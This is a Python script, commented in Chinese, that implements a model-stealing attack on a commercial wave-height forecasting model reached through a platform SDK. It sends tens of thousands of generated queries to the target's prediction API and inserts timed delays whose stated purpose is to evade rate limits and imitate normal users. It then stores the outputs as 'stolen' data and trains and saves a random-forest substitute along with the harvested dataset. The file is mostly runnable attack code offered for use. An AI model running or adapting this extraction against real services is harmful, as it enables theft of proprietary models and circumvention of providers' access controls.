# malicious_model_stealing.py
import numpy as np
import pandas as pd
from sklearn.ensemble import RandomForestRegressor
from sklearn.model_selection import train_test_split
import joblib
import time
from platform_sdk.model_client import PredictiveModelClient

class ModelStealer:
    def __init__(self, target_model_name, output_model_path):
        self.client = PredictiveModelClient(model_name=target_model_name)
        self.output_path = output_model_path
        self.stolen_data = []  # 存储窃取的数据 (features, output)
        self.substitute_model = None
        self.query_stats = {'total_queries': 0, 'failed_queries': 0}

    def generate_query_inputs(self, strategy='grid', num_samples=10000):
        """
        生成用于查询的输入样本。策略是关键，需要尽可能覆盖模型的输入空间。
        """
        print(f"[+] Generating {num_samples} query inputs using '{strategy}' strategy...")
        
        if strategy == 'random':
            # 随机采样策略：简单但可能低效
            # 假设输入特征范围：[lat, lon, time_offset, wind_speed, wind_direction]
            lat_min, lat_max = 10.0, 50.0
            lon_min, lon_max = 110.0, 150.0
            time_min, time_max = 0, 7*24*3600  # 未来7天
            wind_speed_min, wind_speed_max = 0.0, 30.0
            wind_dir_min, wind_dir_max = 0, 360

            for _ in range(num_samples):
                sample = [
                    np.random.uniform(lat_min, lat_max),
                    np.random.uniform(lon_min, lon_max),
                    np.random.uniform(time_min, time_max),
                    np.random.uniform(wind_speed_min, wind_speed_max),
                    np.random.uniform(wind_dir_min, wind_dir_max)
                ]
                yield sample

        elif strategy == 'lhs': 
            # 更高级的策略：拉丁超立方采样 (Latin Hypercube Sampling)，覆盖更均匀
            # 这里简化为实现随机采样，但实际应用中会使用LHS库
            print("    Using Latin Hypercube Sampling for better coverage.")
            # from pyDOE2 import lhs 
            # lhs_samples = lhs(5, samples=num_samples) # 5个特征
            # ... 将LHS样本缩放到实际范围
            # for sample in lhs_samples:
            #   yield sample
            yield from self.generate_query_inputs('random', num_samples) #  fallback

        elif strategy == 'adaptive':
            # 最精巧的策略：基于已查询结果的主动学习
            # 初期随机采样，后期针对替代模型不确定高的区域进行采样
            print("    Using adaptive query strategy.")
            # 初始批次使用随机
            initial_samples = 2000
            yield from self.generate_query_inputs('random', initial_samples)
            # 后续批次需要根据现有 stolen_data 和 substitute_model 动态生成
            # 这里简化处理
            yield from self.generate_query_inputs('random', num_samples - initial_samples)

    def steal_model_data(self, total_queries=50000, batch_size=1000, delay_between_batches=5):
        """
        核心窃取循环：查询目标模型并存储输入-输出对。
        """
        print(f"[+] Starting model stealing process. Target: {total_queries} queries.")
        query_generator = self.generate_query_inputs(strategy='adaptive', num_samples=total_queries)

        for batch_num in range(0, total_queries, batch_size):
            current_batch_size = min(batch_size, total_queries - batch_num)
            batch_data = []
            print(f"    Preparing batch {batch_num//batch_size + 1}/{(total_queries//batch_size)+1} ({current_batch_size} samples)...")

            # 准备当前批次的输入
            for i in range(current_batch_size):
                try:
                    input_features = next(query_generator)
                    batch_data.append(input_features)
                except StopIteration:
                    break

            # 查询目标模型API
            print(f"    Querying target model for {len(batch_data)} samples...")
            batch_results = []
            for features in batch_data:
                try:
                    # 这是实际的API调用
                    prediction = self.client.predict(features)
                    # 假设prediction是字典，例如 {'significant_wave_height': 2.5, 'mean_wave_period': 6.1}
                    batch_results.append(prediction)
                    self.query_stats['total_queries'] += 1
                    # 添加微小延迟，规避速率限制
                    time.sleep(0.05)
                except Exception as e:
                    print(f"        Query failed: {e}")
                    batch_results.append(None)
                    self.query_stats['failed_queries'] += 1
                    time.sleep(1) # 失败后等待更久

            # 存储窃取的数据
            for features, result in zip(batch_data, batch_results):
                if result is not None:
                    # 将特征和输出扁平化存储
                    stolen_record = {
                        'features': features,
                        'significant_wave_height': result.get('significant_wave_height'),
                        'mean_wave_period': result.get('mean_wave_period')
                    }
                    self.stolen_data.append(stolen_record)

            print(f"        Batch complete. Success: {len(self.stolen_data)}/{self.query_stats['total_queries']} records stolen.")
            
            # 每隔N个批次，保存一次中间结果并训练一个临时的替代模型
            if (batch_num // batch_size) % 5 == 0 and len(self.stolen_data) > 1000:
                self._train_substitute_model()
                print(f"        Intermediate substitute model trained and evaluated.")

            # 批次间延迟，模拟正常用户行为
            time.sleep(delay_between_batches)

        print(f"[+] Data stealing completed. Total successful queries: {len(self.stolen_data)}")

    def _train_substitute_model(self):
        """使用窃取的数据训练替代模型"""
        if len(self.stolen_data) < 500:
            return

        print("    Training substitute model on stolen data...")
        # 准备训练数据
        df = pd.DataFrame(self.stolen_data)
        X = np.vstack(df['features'].values) # 特征矩阵
        y_wave_height = df['significant_wave_height'].values # 目标变量1
        # y_wave_period = df['mean_wave_period'].values # 目标变量2

        # 分割数据集
        X_train, X_test, y_train, y_test = train_test_split(X, y_wave_height, test_size=0.2, random_state=42)

        # 训练模型（这里以随机森林为例，攻击者可能会尝试多种模型）
        self.substitute_model = RandomForestRegressor(n_estimators=100, random_state=42)
        self.substitute_model.fit(X_train, y_train)

        # 评估替代模型性能（在窃取的数据上）
        score = self.substitute_model.score(X_test, y_test)
        print(f"        Substitute model R² score on test set: {score:.4f}")

        # 保存最新版本的替代模型
        joblib.dump(self.substitute_model, f"{self.output_path}_intermediate.joblib")

    def finalize_and_save_model(self):
        """在所有数据窃取完成后，训练最终版本的替代模型并保存"""
        print("[+] Training final substitute model...")
        self._train_substitute_model() # 在所有数据上再训练一次

        # 保存最终的替代模型
        final_output_path = f"{self.output_path}_final.joblib"
        joblib.dump(self.substitute_model, final_output_path)
        
        # 保存窃取的数据集（可选）
        df = pd.DataFrame(self.stolen_data)
        df.to_csv(f"{self.output_path}_stolen_dataset.csv", index=False)
        
        print(f"[+] Model stealing finished!")
        print(f"    Final model saved to: {final_output_path}")
        print(f"    Stolen dataset saved to: {self.output_path}_stolen_dataset.csv")
        print(f"    Total queries attempted: {self.query_stats['total_queries'] + self.query_stats['failed_queries']}")
        print(f"    Total queries successful: {len(self.stolen_data)}")

def main():
    # 攻击配置
    TARGET_MODEL = "high_precision_wave_forecast_v3"
    OUTPUT_PATH = "stolen_wave_model"

    print(f"[+] Initializing Model Stealer against target: {TARGET_MODEL}")
    stealer = ModelStealer(TARGET_MODEL, OUTPUT_PATH)

    # 开始窃取过程
    try:
        # 计划窃取 50,000 个数据点，每 1000 个一批，批次间延迟 10 秒
        stealer.steal_model_data(total_queries=50000, batch_size=1000, delay_between_batches=10)
    except KeyboardInterrupt:
        print("\n[!] Stealing interrupted by user.")
    except Exception as e:
        print(f"\n[!] Stealing failed with error: {e}")
    finally:
        # 无论如何，尝试保存已窃取的数据和模型
        if stealer.stolen_data:
            stealer.finalize_and_save_model()
        else:
            print("[-] No data was stolen.")

if __name__ == "__main__":
    main()